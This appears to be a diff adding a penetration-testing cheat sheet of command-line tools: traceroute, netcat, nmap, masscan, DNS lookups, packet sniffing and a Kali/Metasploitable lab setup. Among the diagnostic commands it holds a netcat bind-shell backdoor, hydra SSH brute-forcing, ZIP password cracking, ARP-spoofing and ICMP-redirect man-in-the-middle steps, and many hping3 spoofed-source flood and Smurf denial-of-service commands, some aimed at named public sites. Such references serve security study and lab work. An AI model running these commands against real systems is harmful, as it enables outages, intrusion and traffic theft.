@@ -1,0 +1,879 @@
+----------------------------------------------------------------------------------------------------
+mtr www.google.com
+mtr --report google.com
+mtr -4b google.com #combined IPv4 only and IP addresses
+mtr -n google.com #display numeric IP addresses instead of host names
+mtr -c5 google.com #limit the number of pings to a specific value
+mtr -r -c 5 google.com >mtr-report #report mode using the -r flag
+mtr -rw -c 5 google.com >mtr-report #wide report mode 
+mtr -i 2 google.com #The default interval between ICMP ECHO requests is one second
+mtr --tcp test.com #use TCP SYN packets or UDP datagrams instead of the default ICMP ECHO requests
+mtr --udp test.com 
+mtr -m 35 216.58.223.78 #maximum number of hops (default is 30)
+mtr -r -s PACKETSIZE -c 5 google.com >mtr-report #set the packet size used in bytes using the -s
+mtr --csv google.com #Print CSV Output
+mtr --xml google.com
+
+# find route to example.com
+traceroute www.example.com
+#find route to example.com using tcptraceroute (which uses tcp to discover path)
+tcpdraceroute www.example.com
+# The maximum number of hops can be adjusted with the -m flag.
+traceroute -m 255 obiwan.scrye.net
+# adjust the size of the packet that is sent to each hop by giving the integer after the hostname
+traceroute google.com 70
+
+Specify Gateway
+sudo traceroute  -g 10.0.2.2 yahoo.com
+traceroute -g 192.5.146.4 -g 10.3.0.5 35.0.0.0
+#shows the path of a packet that goes from istanbul to sanfrancisco through the hosts cairo and paris
+#The -I option makes traceroute send ICMP ECHO probes to the host sanfrancisco
+#The -i options sets the source address to the IP address configured on the interface qe0
+traceroute -g cairo -g paris -i qe0 -q 1 -I sanfrancisco 
+ip r / ip route #gateway / router
+ip r | grep default #default gateway
+
+#The U flag indicates that the route is up; 
+#The G flag indicates that the route is to a gateway. 
+#The H flag indicates that the destination is a fully qualified host address, rather than a network. 
+route -n #Do not use protocol or host name , use IP  or  port number 
+route -V #version
+route -nee #more detailed information
+route -Cn #list kernel’s routing cache information
+
+routel #list routes
+routel | grep default #default gateway
+
+Specify Source Interface
+sudo traceroute  -i eth0 yahoo.com
+Autonomous Systems
+traceroute  -A  yahoo.com
+traceroute -I google.com
+
+tracepath yahoo.com
+tracepath -n yahoo.com
+tracepath -b yahoo.com
+sets the initial packet length
+tracepath -l 28 yahoo.com
+set maximum hops (or maximum TTLs) to max_hops
+tracepath -m 5 yahoo.com
+set the initial destination port to use
+tracepath -p 8081  yahoo.com
+
+----------------------------------------------------------------------------------------------------
+sudo apt-get install p0f -yqq
+p0f -L #LISTENING ALL THE INTERFACES
+p0f -i eth0 -p -o /tmp/p0f.log # one interface and logging, -p promiscous mode
+p0f -r /tmp/dump.pcap -o dump-result.log # analyze pcap file
+----------------------------------------------------------------------------------------------------
+#ZIP Password Cracking Windows
+>zip2john.exe test.zip > test.hash #generate the hash with zip2john
+>type test.hash
+>john.exe --pot=test.pot --wordlist=\tmp\wordlists\Passwords\Common-Credentials\10-million-password-list-top-1000000.txt
+>john.exe --pot=test.pot --show test.hash
+>type test.pot
+
+#ZIP Password Cracking Linux
+zip2john test.zip > zip.hash #generate the hash with zip2john
+john --wordlist=/tmp/wordlists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt zip.hash
+----------------------------------------------------------------------------------------------------
+(netcat or nc or ncat)
+
+#Use Netcat as a Simple Web Server
+vi index.html #make a simple HTML file
+printf 'HTTP/1.1 200 OK\n\n%s' "$(cat index.html)" | netcat -l 8888 #
+http://server_IP:8888 #access the content,serve the page, and then the netcat connection will close
+"while true; do printf 'HTTP/1.1 200 OK\n\n%s' "$(cat index.html)" | netcat -l 8888; done" #have netcat serve the page indefinitely by wrapping the last command in an infinite loop
+
+netcat -z -v domain.com 1-1000 #scan all ports up to 1000
+netcat -z -n -v 198.51.100.0 1-1000 #-n flag to specify that you do not need to resolve the IP address using DNS
+netcat -z -n -v 198.51.100.0 1-1000 2>&1 | grep succeeded #redirect standard error to standard output using the 2>&1 bash syntax. then filter the results with grep:
+
+#gather more information about a service running on a system’s open port , known as banner grabbing 
+nc -nvv x.x.x.x 80
+nc -uvz 192.168.58.9 161
+nc u v w2 x.x.x.x 1-1024 #netcat used to perform a UDP scan of the lower 1024 ports
+$ nc -l 8080 #listening to port 8080 for inbound connections
+
+nc -vvul -p 9192 // listen UDP traffic
+nc -vvl -p 8182 // listen TCP traffic
+
+#listen UDP traffic on the port
+$ nc -vvul -p 9192 & 
+[3] 24622
+$ Listening on [0.0.0.0] (family 0, port 9192)
+#verify netcat is listening on the port
+$ nc -vuz -w 3 0.0.0.0 9192 
+XXXXXConnection to 0.0.0.0 9192 port [udp/*] succeeded!
+
+$ ping 8.8.4.4 | nc -v 192.168.99.100 8182 // send traces to open a TCP port
+$ ping 8.8.8.8 | nc -vu 192.168.99.100 9192 // send traces to an UDP port
+
+// send traces to an UDP port without netcat
+$ ping 8.8.4.4 > /dev/udp/192.168.99.100/9192 
+
+// send traces to a TCP port without `netcat`
+$ tail -f /opt/wso2esb01a/repository/logs/wso2carbon.log > /dev/tcp/192.168.99.100/8182
+$ tail -f /opt/wiremock/wiremock.log | nc -vu 192.168.99.100 9192  #WireMock is a simulator for HTTP-based APIs. 
+// send traces to an UDP port without `netcat`
+$ tail -f /opt/wso2am02a/repository/logs/wso2carbon.log > /dev/udp/192.168.99.100/9192
+
+$ nc -l 1234 > filename.out #Start by using nc to listen on a specific port, with output captured into a file
+ $ nc host.example.com 1234 < filename.in #Using a second machine, connect to the listening nc process, feeding it the file which is to be transferred
+$ netcat -l 4444 > received_file #instead of printing information onto the screen, place all of the information straight into a file
+$ netcat domain.com 4444 < original_file # use this file as an input for the netcat connection we will establish to the listening computer. The file will be transmitted 
+
+#On the receiving end, anticipate a file coming over that will need to be unzipped and extracted by typing
+'netcat -l 4444 | tar xzvf -' #The ending dash (-) means that tar will operate on standard input, which is being piped from netcat across the network when a connection is made.
+'tar -czf - * | netcat domain.com 444' # pack them into a tarball and then send them to the remote computer through netcat
+
+$ nc -l -u 1234 #listening a udp port ‘1234’ , verify w sudo netstat -tunlp | grep 1234
+$ nc -v -u 192.168.105.150 53 #send or test UDP port connectivity to a specific remote host
+
+$ nc 192.168.1.100 80 #connection to server with IP address 192.168.1.100 will be made at port 80 & we can now send instructions
+GET / HTTP/1.1 #get the page name
+HEAD / HTTP/1.1 #get banner for OS fingerprinting
+
+$ echo -n "GET / HTTP/1.0\r\n\r\n" | nc host.example.com 80 #retrieve the home page of a web site
+
+#NC as chat tool
+$ ncat -l 8080 #configure server to listen to a port & make connection to server from a remote machine on same port & start sending message
+$ ncat SERVER_IP 8080 #On remote client machine
+
+#NC as a proxy
+#all the connections coming to our server on port 8080 will be automatically redirected to 192.168.1.200 server on port 80
+$ ncat -l 8080 | ncat 192.168.1.200 80 #using a pipe, data can only be transferred & to be able to receive the data back
+#create a two way pipe,send & receive data over nc proxy
+$ mkfifo 2way
+$ ncat -l 8080 0<2way | ncat 192.168.1.200 80 1>2way
+
+$ ncat -l  8080 > file.txt #Start with machine on which data is to be received & start nc is listener mode
+$ ncat 192.168.1.100 8080 --send-only < data.txt #on the machine from where data is to be copied, –send-only option will close the connection once the file has been copied
+
+$ ncat -l 10000 -e /bin/bash #create a backdoor,‘e‘ flag attaches a bash to port 10000
+$ ncat 192.168.1.100 1000 #a client can connect to port 10000 on server
+
+$ nc -p 31337 -w 5 host.example.com 42 #Open a TCP connection to port 42 of host.example.com, using port 31337 as the source port, with a timeout of 5 seconds
+$ nc -s 10.1.2.3 host.example.com 42 #Open a TCP connection to port 42 of host.example.com using 10.1.2.3 as the IP for the local end of the connection
+$ nc -lU /var/tmp/dsocket #Create and listen on a Unix Domain Socket
+$ nc -x10.2.3.4:8080 -Xconnect host.example.com 42 #Connect to port 42 of host.example.com via an HTTP proxy at 10.2.3.4, port 8080
+
+   
+$ ncat -u -l  80 -c  'ncat -u -l 8080' #all the connections for port 80 will be forwarded to port 8080
+$ ncat -w 10 192.168.1.100 8080 #Listener mode in ncat will continue to run,configure timeouts with option ‘w’
+$ ncat -l -k 8080 #When client disconnects from server, after sometime server also stops listening.force server to stay connected & continuing port listening with option ‘k’.
+----------------------------------------------------------------------------------------------------
+#when the user knows the format of requests required by the server.
+#an email may be submitted to an SMTP server
+
+$ nc localhost 25 << EOF
+HELO host.example.com
+MAIL FROM: <user@host.example.com>
+RCPT TO: <user2@host.example.com>
+DATA
+Body of email.
+.
+QUIT
+EOF
+----------------------------------------------------------------------------------------------------
+# it is necessary to first make a connection, and then break the connection when the banner has been retrieved. 
+#This can be accomplished by specifying a small timeout with the -w flag
+#or by issuing a "QUIT" command to the server
+
+$ echo "QUIT" | nc host.example.com 20-30
+SSH-1.99-OpenSSH_3.6.1p2
+Protocol mismatch.
+220 host.example.com IMS SMTP Receiver Version 0.84 Ready
+----------------------------------------------------------------------------------------------------
+#parallelized login cracker which supports numerous protocols to attack
+hydra -L unix_users.txt -P unix_passwords.txt ssh://192.169.42.33
+hydra -l user -P unix_passwords.txt ssh://192.169.42.33
+hydra -l root -P root_userpass.txt ssh://192.169.42.33
+
+----------------------------------------------------------------------------------------------------
+zmap -p 80 172.217.0.0/24 -o IPresults.csv #scan 255 IP addresses on a class B network
+wc -l IPresults.csv #the total count of IP addresses  with open port 80 
+zmap -p 80 10.0.2.15 -o LANresults.csv
+zmap -p 10.0.0.0/16 -o LANresults.csv
+#scan only 10.0.0.0/8 and 192.168.0.0/16 on TCP/80
+zmap -p 80 10.0.0.0/8 192.168.0.0/16
+mousepad /etc/zmap/blacklist.conf #Zmap's blacklist
+zmap  -B 10M -p 80 10.0.0.0/16 -o LANresults.csv #limit the bandwidth Zmap uses to 10 thousand packets per second
+#scan 10,000 random addresses on port 80 at a maximum 10 Mbps
+zmap --bandwidth=10M --target-port=80 --max-targets=10000 --output-file=results.csv
+zmap -B 10M -p 80 -n 10000 -o results.csv
+----------------------------------------------------------------------------------------------------
+SYN : -mT
+ACK scan : -mTsA
+Fin scan : -mTsF
+Null scan : -mTs
+Xmas scan : -mTsFPU
+Connect Scan : -msf -Iv
+Full Xmas scan : -mTFSRPAU
+scan ports 1 through 5 : (-mT) host:1-5
+
+unicornscan -r30 -mT adaptercart.com #get details of open and closed ports of a website called adaptercart.
+unicornscan -r33 -mT linuxhint.com #send 33 packets per second by adding -r33 –mT to indicate scan (m) using the TCP protocol.
+unicornscan -r33 -mT linuxhint.com:67,420 #ports 67 and 420
+unicornscan -r300 -mU linuxhint.com #scan for UDP ports
+unicornscan -r30 -mT google.com # get details of open and closed ports of a website
+unicornscan 216.1.0.0/8:5505 -r500 -w huntfor5505.pcap -W1 -s 192.168.100.35 #Saving results to a PCAP file
+
+unicornscan –mU –v –I 192.168.1.1/24 #perform a UDP scan on the whole network
+unicornscan -msf -v 192.168.1.1/24 #perform a TCP SYN Scan on a whole network
+unicornscan -i eth1 -Ir 160 -E 192.168.1.0/24:1-4000 gateway:a
+unicornscan 192.168.100.35 192.168.100.45
+unicornscan 192.168.100.35
+unicornscan 192.168.100.35/24:31 #Scanning Class C networks find all the IPs with port 31 open
+unicornscan 192.168.1.250 –Iv #get the TTL value of corresponding ports and  identify the operating system
+----------------------------------------------------------------------------------------------------
+masscan --regres #test whether the installation of masscan is proper
+masscan -p80,8000-8100 10.0.0.0/8 2603:3001:2d00:da00::/112 #scan the 10.x.x.x subnet, and 2603:3001:2d00:da00::x subnets
+masscan 10.10.10.1/1 -p80
+masscan 198.134.112.244 -p443
+masscan 198.134.112.240/28 -p80,443,25 #multiple ports
+masscan 198.134.112.240/28 -p1000-9999 #range of ports
+masscan 192.168.1.105 ‐‐top-ports 10
+masscan 198.134.112.0/20 --top-ports 100 --rate 100000 > output.txt
+masscan 192.168.1.105 ‐‐top-ports 10 ‐‐excludefile exclude-list.txt
+masscan 10.10.10.1 -p1-50 #Multi port scan
+masscan 10.10.10.1 -p1,20,80 
+masscan 10.10.10.1 -pU:53 #UDP scan
+masscan 10.0.0.1/24 --rate 10000 -p80 #increase the speed of the scan
+masscan 180.215.0.0/16 -p0-1000 --exclude=180.215.122.120 #Exclude IP
+masscan 180.215.0.0/16 --exclude=180.215.122.120 -p22,23,80,443
+masscan 10.0.0.0/8  -p80 --open-only #scan for only open ports
+masscan 0.0.0.0/0 --excludefile 255.255.255.255 -pU:53 --banners #Gathering the server version by entering –banners
+masscan 10.1.1.1/24 -p 0-65535 --rate 1000000 --open-only --http-user-agent \
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" \
+ -oL "output.txt"
+ 
+ host google.com #gives the IP of google.com web server
+ masscan 216.58.196.0/24 -p80,443 #scan IPs 216.58.196.1-254
+ #grab banners from the IPs
+ #kali has IP address 192.168.1.4.specify a source IP in the 192.168.1.0/24 range
+ masscan 216.58.196.218  -p 80,443 --banners --source-ip 192.168.1.200 #
+ masscan 216.58.196.0/24 -p80,443 --output-format=xml --output-filename=test.xml #save the results into file
+ masscan 216.58.196.0/24 -p80,443 -oX test.xml # Wireshark,Etherape to visualize
+
+ masscan 216.58.196.0/24 -p80,443 -oX test.xml  #pause scan ctrl+c
+ masscan --resume paused.conf #resume the scan
+ 
+masscan 0.0.0.0/4 -p80 --rate 100 --offline #scan whole IP address subnets but without going into the internet.
+#increase the rate gradually to 1000, 100000 one at a time and see how much the network & system can perform
+#Compare the times required
+masscan 0.0.0.0/4 -p80 --rate 10000000 --offline #
+masscan 0.0.0.0/0 -p22 --rate 10000000
+masscan 0.0.0.0/0 -p0-65535 --rate 10000000 #at full speed (10 million p/s).
+masscan 0.0.0.0/0 -p0-65535 #Scanning the entire Internet is bad
+masscan 0.0.0.0/0 -p0-65535 --excludefile exclude.txt #blacklist or exclude ranges
+masscan 0.0.0.0/0 -p0-65535 -oX scan.xml #saves the results in an XML file
+masscan -p 80 0.0.0.0/0 --excludefile IPBlacklist.list -oL result.out
+#increases the rate to 100,000 packets/second
+#scan the entire Internet in about 10 hours per port (or 655,360 hours if scanning all ports).
+masscan 0.0.0.0/0 -p0-65535 --max-rate 100000
+
+#Performance testing
+#The bogus --router-mac keeps packets on the local network segments so that they won't go out to the Internet
+masscan 0.0.0.0/4 -p80 --rate 100000000 --router-mac 66-55-44-33-22-11 #
+
+masscan 172.217.0.0/16 --rate=1 -p80,443 --ping #an ICMP Echo request also with the scan
+
+masscan <target> <ports> --adapter-ip <ipaddress>
+masscan <target> <ports> --adapter-port <port/port-range>
+
+
+
+#multiple instances of masscan for the same range of IPs
+masscan 172.217.0.0/16 --rate=1 -p80,443 --shards 1/2 #Attacker 1 the first instance would scan the IPs with index 0
+masscan 172.217.0.0/16 --rate=1 -p80,443 --shards 2/2 #Attacker 2 second instance would scan IPs with index 1
+
+masscan -c config #sample configuration file,all the options together in 1 single config file
+# Adapter
+adapter-ip = 10.108.51.130
+adapter-port = 5000-5127
+rate = 10.00
+shard = 1/1
+
+# Targets
+retries = 2
+ports = 80,443,U:53,U:161
+range = 172.217.0.0/16
+exclude = 172.217.0.50
+exclude-file /root/masscan-exclusion.list
+
+#Output Options
+output-format = xml
+show = open
+output-filename = google.xml
+
+# Scan Options
+banners = true
+ping = true
+
+----------------------------------------------------------------------------------------------------
+#Web Content Scanner
+dirb http://192.169.42.33 /usr/share/dirb/wordlists/common.txt
+#web server scanner
+nikto -host 192.169.42.33
+
+#set mtu size 8
+nmap --mtu 8 192.169.42.3 --packet_trace -n -p 80
+nmap -p80 192.169.42.3 -oG -|nikto -h -
+nmap -p0-65535 192.168.2.7
+----------------------------------------------------------------------------------------------------
+#To get around this, nmap can also send a TCP ACK packet to (by default) port 80.
+#If the remote machine responds with a RST back, then that machine is up
+#Another possibility is to send the remote machine a SYN packet and wait for an RST or a SYN/ACK
+nmap -sP # “ping scanning,sites now block echo request packets,nmap sends out ICMP echo request packets to every IP address in a network
+
+#network discovery scan with OS detction
+nmap -O -PE 192.168.15.1/2
+nmap -sO 62.233.173.90 para #IP protocol scan of a router and a typical Linux 2.4 box
+nmap --open -sO 10.100.0.14
+nmap -PO 192.168.1.1 # do not ping before scanning,many sites now block/filter the ping echo request packets 
+nmap -sS -A -P0 moonshine.ecn.purdue.edu #The ’-P0’ option (the second letter is ’zero’),do not use ping whether a machine is up
+nmap -sS 192.168.1.1 # Stealthy scan
+nmap -sS 10.100.0.14 -p-
+nmap -sS localhost #carry out a port scan of your own machine,The “-sS” option carries out a SYN scan
+#If the target machine has the DenyHosts shield running to ward off the dictionary attacks
+#-A’ option turned on, IP address may become quarantined on the target machine,assuming that port 22 is included in the range of the ports scanned
+nmap -sS -A moonshine.ecn.purdue.edu #an “aggressive” SYN scan,
+
+nmap -sT 187.36.24.156 # TCP connect scan,establish the TCP connection with the target to get the ports’ status
+#The TCP connect scan (-sT) is the default TCP scan type when the TCP SYN scan (-sS) is not an option
+#The -O option detects the operating system of the host
+nmap -sT -O 192.168.122.65
+
+nmap -p 1-1024 -sT moonshine.ecn.purdue.edu #only the first 1024 ports
+
+nmap -Pn 62.233.173.90 #Host seems down. If it is really up, but blocking our ping probes
+nmap -Pn --top-ports 20 62.233.173.90
+
+nmap -p 1-65535 localhost #Scan specific ports or scan entire port ranges on a local or remote server
+
+nmap -Pn -T4 --traceroute www.target.com # find IP,reverse-DNS and traceroute scan 
+
+nmap -sX -T2 linuxhint.com #Xmas scan Polite: -T2, neutral.
+nmap -sX -T4 linuxhint.com #Xmas scan Aggressive: -T4, fast scan
+nmap -sV -sX -T4 linuxhint.com #Xmas scan Aggressive: -T4, fast scan -sV for version detection on specific ports and distinguish between filtered and filtered ports,
+
+nmap 1.1.1.1 8.8.8.8 #scan multiple IP addresses
+nmap 1.1.1.1,2,3,4 #scan consecutive IP addresses
+nmap 8.8.8.0/28 #scan entire CIDR IP ranges, from 8.8.8.1 to 8.8.8.14
+nmap 8.8.8.1-14 #from 8.8.8.1 to 8.8.8.14
+nmap 8.8.8.* #scan 256 IP addresses from 8.8.8.1 to 8.8.8.256
+nmap 8.8.8.* --exclude 8.8.8.1
+nmap 192.168.1.0-255
+nmap 192.168.1.1-255 --exclude 192.168.1.15
+nmap 192.168.1.1-255 --exclude 192.168.1.1,192.168.1.2
+nmap -Pn 192.168.1.0-255
+
+$ cat bigmac.txt
+   192.168.1.1
+   192.168.1.254
+$ nmap --exclude-file bigmac.txt 192.168.1.1-255
+
+nmap --top-ports 20 192.168.1.106 #scan the top X most common ports for that host
+
+nmap -iL list.txt
+cat list.txt
+192.168.1.106
+cloudflare.com
+microsoft.com
+securitytrails.com
+
+nmap -oN output.txt securitytrails.com
+nmap -oX output.xml securitytrails.com
+
+#Iptables rules to block Xmas scan
+iptables -A INPUT -p tcp --tcp-flags FIN,URG,PSH FIN,URG,PSH -j DROP
+iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
+iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
+iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
+
+nmap -sN 192.168.100.11 #TCP Null scan Does not set any bits (TCP flag header is 0)
+nmap -sF 192.168.100.11 #FIN scan (-sF) Sets just the TCP FIN bit.
+nmap -sW -T4 docsrv.caldera.com #TCP Window Scan
+
+#identify a web application firewall
+nmap --script=http-waf-fingerprint targetwebsite.com
+----------------------------------------------------------------------------------------------------
+#web vulnerability scanner
+uniscan -u http://192.169.42.3 -qweds
+ls /usr/share/uniscan/report/
+192.169.42.3.html 
+
+#set 5000 byte packet size
+ping -l 5000 192.169.42.3 -n 1
+#source routing
+ping -j 192.169.42.3 8.8.8.8
+#source routing  linux-based routers
+sysctl -w net.ipv4.conf.<interface>.accept_source_route=1
+#FreeBSD (pfSense) 
+sysctls net.inet.ip.sourceroute and net.inet.ip.accept_sourceroute
+----------------------------------------------------------------------------------------------------
+ssldump -A -d -i eth0
+ssldump -i le0 port 443
+ssldump -i le0 port 443 and host 192.169.42.3
+ssldump -Ad -k ~/server.pem -p foobar -i le0 host exch #decrypt traffic to to host exch server.pem and the password foobar
+#wget -p https://192.169.42.3/ -O /dev/null
+ssldump  port 443 and host 192.169.42.3
+----------------------------------------------------------------------------------------------------
+#Saving fw monitor logs to a .pcap file to analyse in wireshark
+#Use WinSCP to access the Security Gateway and copy the file to your local drive to analyze it in Wireshark
+fw monitor -e 'accept (src=10.1.1.1 and dst=20.2.2.2) or (src=20.2.2.2 and dst=10.1.1.1);' -m iIoO -o wireshark.pcap
+fw monitor -e 'accept (src=192.167.4.244 and dst=193.140.12.215) or (src=193.140.12.215 and dst=192.167.4.244 );' -m iIoO -o wireshark1.pcap
+
+start Wireshark from the command line.
+$ wireshark -r test.pcap
+
+#scenario #1
+#machine acts as a router    
+sysctl -w net.ipv4.ip_forward=1
+arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]
+arpspoof -i wlan0 -t 192.000.000.52 192.000.000.1
+arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]
+arpspoof -i wlan0 -t 192.000.000.1 192.000.000.52
+#listens to network traffic and picks out images from TCP streams it observes
+driftnet -i [Network Interface Name]
+#sniffs HTTP requests in Common Log Format
+urlsnarf -i [Network interface name]
+
+
+#ICMP redirect MITM attack
+/etc/sysctl.conf
+net.ipv4.conf.all.accept_redirects = 0
+hping3 -I eth0 -C 5 -K 1 -a 10.0.2.2 --icmp-ipdst 8.8.8.8 --icmp-gw 10.0.2.15 --icmp-ipsrc 10.0.2.16
+
+#operating system detection w ICMP packages
+hping3 -1 -c 1 –K 58 10.0.2.16
+hping3 -a 10.1.1.1 -p 80 -S www.alibaba.com
+hping3 -S 192.168.1.105 -p 80
+hping -S 192.168.1.105 -p ++1
+hping3 -f 192.168.1.105 -p 80
+
+   
+# -d is the data payload size (here, we've designated it as 10 bytes)
+# -E tells hping3 to grab data from the following file
+hping3 -f 192.168.1.105 -p 80 -d 10 -E malware
+
+# -z connects the command to the ctrl z on the keyboard so that every time we press it, the TTL is incremented by 1
+# -t sets the initial TTL (in this case, we're using 1)
+# -S sets the flag to SYN
+# -p 80 sets the destination port to 80
+hping3 -z -t 1 -S google.com -p 80
+    
+
+
+DoS using hping3 with random source IP
+-c 100000 = Number of packets to send.
+-d 120 = Size of each packet that was sent to target machine.
+-S = I am sending SYN packets only.
+-w 64 = TCP window size.
+-p 21 = Destination port (21 being FTP port). You can use any port here.
+--flood = Sending packets as fast as possible, without taking care to show incoming replies. Flood mode.
+--rand-source = Using Random Source IP Addresses. You can also use -a or –spoof to hide hostnames. See MAN page below.
+www.hping3testsite.com = Destination IP address/website name 
+$hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
+
+#SYN flood – DoS using HPING3
+hping3 -S --flood -V www.hping3testsite.com
+#-p option is used to set the remote port number for the flood
+#-S option is used to set the flood type for the TCP protocol which is the sync flood
+hping3 -S --flood -p 80 www.wisetut.com
+
+hping3 --traceroute -v -1 www.wisetut.com #the traceroute feature which is used to identify the intermediate hosts between source and destination
+
+Advanced SYN flood with random source IP, different data size, and window size
+hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE
+–flood: sent packets as fast as possible
+–rand-source: random source address
+-c –count: packet count
+-d –data: data size
+-S –syn: set SYN flag
+-w –win: winsize (default 64)
+-p –destport: destination port (default 0)
+$hping3 -S --flood -V -p TARGET_PORT TARGET_SITE
+
+
+FIN floods
+$hping3 --flood --rand-source -F -p TARGET_PORT TARGET_IP
+TCP RST Flood
+$hping3 --flood --rand-source -R -p TARGET_PORT TARGET_IP
+PUSH and ACK Flood
+$hping3 --flood --rand-source -PA -p TARGET_PORT TARGET_IP
+ICMP flood
+$hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP
+UDP Flood
+–flood: sent packets as fast as possible
+–rand-source: random source address
+–udp: UDP mode
+-p –destport: destination port (default 0)
+$hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP
+SYN flood with spoofed IP – DoS using HPING3
+$hping3 -S -P -U --flood -V --rand-source www.hping3testsite.com
+TCP connect flood – DoS using NPING
+$nping --tcp-connect -rate=90000 -c 900000 -q www.hping3testsite.com    
+    
+    
+use routers broadcast IP address feature to send messages to multiple IP addresses 
+use connection-less protocols that do not validate source IP addresses.
+amplification techniques;Smurf attack(ICMP amplification), DNS amplification, and Fraggle attack(UDP amplification)
+    
+
+Smurf Attack
+This command sends ping requests to broadcast IP(10.10.15.255) by spoofing target IP(10.10.15.152). 
+All running hosts in this network reply to the target.
+$hping3 --icmp --spoof TARGET_IP BROADCAST_IP
+$hping3 --icmp --spoof 10.10.15.152 10.10.15.255
+
+DNS lookups
+$ whois www.alibaba.com
+
+dig alibaba.com @8.8.8.8 #specify name server 8.8.8.8
+dig @8.8.8.8 +short NS domain.com
+dig www.alibaba.com ANY +noall +answer
+#Find Out TTL Value Using dig
+dig +nocmd +noall +answer a www.alibaba.com
+#Find Domain SOA Record
+$ dig +nssearch www.alibaba.com
+#Display All Records
+$ dig +noall +answer www.alibaba.com any
+#Get Only Short Answer
+$ dig +short www.alibaba.com
+#Trace Domain Delegation Path
+$ dig +trace www.alibaba.com
+$ dig -x 217.168.240.132
+$ dig +noall +answer -x 217.168.240.132
+$ dig -x 193.140.80.208 +short 
+$ dig -x 193.140.80.208 +trace
+check if your mail servers direct correctly
+$dig your_domain_name.com MX
+check if "A" records are set correctly
+$dig your_domain_name.com
+
+
+Get TTL Information
+$ host -v -t {TYPE} {example.com}
+host -t any www.alibaba.com
+Find Out the Domain IP
+$ host -v -t a cyberciti.biz
+Find Out the Domain Mail Server
+$ host -v -t mx cyberciti.biz
+$ host -v -t soa cyberciti.biz
+Find Out the Domain Name Servers
+$ host -v -t ns cyberciti.biz
+$ host -a www.alibaba.com
+Find Out the Domain CNAME Record
+$ host -t cname files.cyberciti.biz
+Query Particular Name Server
+$ host www.alibaba.com ns1.www.alibaba.com
+Find Out the Domain TXT Recored (e.g. SPF)
+$ host -t txt www.alibaba.com
+Reverse DNS lookup 
+$host 217.168.240.132
+$host -v -t ptr 75.126.153.206
+#FW trick
+#By default, host command uses UDP protocol,Pass the -T option to use a TCP connection when querying the name server. 
+#see if the name server works over TCP and firewall allows queries over the TCP
+host -t cname files.cyberciti.biz
+
+
+
+#change the default timeout to wait for a reply using -timeout option.
+nslookup -timeout=10 redhat.com	
+nslookup -debug redhat.com
+nslookup -type=any www.alibaba.com
+#By default DNS servers uses the port number 53. If the port number changes
+nslookup -port 56 redhat.com
+specify a particular name server to resolve the domain name, ns1.redhat.com as the DNS server, ns1.redhat.com has all the zone information of redhat.com
+nslookup redhat.com ns1.redhat.com
+#view all the available DNS records using -query=any option.
+nslookup -type=any google.com
+nslookup 217.168.240.132
+
+
+
+look up geolocation from the command line
+$ curl ipinfo.io/23.66.166.151 
+
+$ sudo yum install GeoIP GeoIP-data
+$ geoiplookup 8.8.4.4
+set this up as a cron:
+$ /usr/bin/geoipupdate
+
+============================================================================
+download Kali Linux 64-bit VirtualBox 
+https://www.kali.org/downloads
+
+File - Import Appliance - Import
+import kali-linux-2019.3a-vbox-amd64.ova
+u/p root/toor
+download Metasploitable 2
+https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide
+Create a new VM for Metasploitable 2
+u/p msfadmin/msfadmin
+
+Create a network
+File - Preferences - Network; Supports DHCP
+
+Config VMs network 
+Settings - Network - Attached to - NAT Network 
+
+============================================================================
+Scapy to perform layer 2 discovery
+# scapy
+>>> ARP().display()
+>>> arp_request1 = ARP()
+>>> arp_request1.pdst = "192.168.2.11"
+>>> arp_request1.display()
+>>> sr1(arp_request1)
+>>> sr1(ARP(pdst="192.168.2.11"))
+============================================================================
+$ sec -conf=root_login_attempts.conf -input=-
+# root_login_attempts.conf sec rule 
+type=Single
+ptype=RegExp
+pattern=Failed password for root
+desc=Matched: $0
+action=logonly
+============================================================================
+Listen to the interface and print a single packet
+netsniff-ng --num 1 --in eth1
+Write traffic coming in on eth0 to dump.pcap and don't print any output. 
+netsniff-ng --in eth0 --out dump.pcap --silent --bind-cpu 0
+write a new pcap to the /mypcaps directory each day
+netsniff-ng --in eth0 --out /mypcaps --interval 24hrs
+send packets from eth0 to eth1
+netsniff-ng --in eth0 --out eth1 --mmap --silent --prio-high
+replay a network trace to an IDS listening on eth0 or attached to a hub
+netsniff-ng --in dump.pcap --mmap --out eth0 -k1000 --silent --bind-cpu 1
+Apply a BPF filter, print matched packets in ASCII, accept jumbo frames, and increase verbosity:
+netsniff-ng --in any --filter http.bpf --jumbo-support --ascii -V
+Write new file every 10 seconds to the current directory and print packet statistics for every interval by specifying verbose mode
+netsniff-ng --in any -s --out . --interval 10sec -V
+Write a low-level BPF filter with bpfc and then pass to netsniff-ng
+$ bpfc -i sample_bpf.txt > ethernet.bpfc
+$ netsniff-ng --in eth0 --out ethernet.pcap --filter ethernet.bpfc
+Use tcpdump to dump BPF filter opcodes to file and pass to netsniff-ng
+tcpdump -dd 'ip src 192.168.1.1 and tcp and port (53 or 80 or 443)' > myfilter.bpf
+netsniff-ng --in eth0 --filter myfilter.bpf --ascii
+Create a trafgen configuration file from a pcap and generate it out eth1 in random order.
+netsniff-ng --in ns-ng.pcap --out ns-ng.cfg -s
+trafgen --in ns-ng.cfg --out eth1 --rand
+
+============================================================================
+fping 50.116.66.139 173.194.35.35 98.139.183.24 #fping multiple IP address at once and it will display status as alive or unreachable
+fping -s -g 192.168.0.1 192.168.0.9 #fping a specified range of IP addresses
+fping -g -r 1 192.168.0.0/24 #ping complete network and repeat once (-r 1)
+fping < fping.txt #create a file called fping.txt having IP address (173.194.35.35 and 98.139.183.24) to fping
+============================================================================
+#Wireshark installation directory:
+    Windows 32-bit:
+    C:\> cd /d  "C:\Program Files (x86)\Wireshark\"
+    Windows 64-bit:
+    C:\> cd /d  "C:\Program Files\Wireshark\"
+
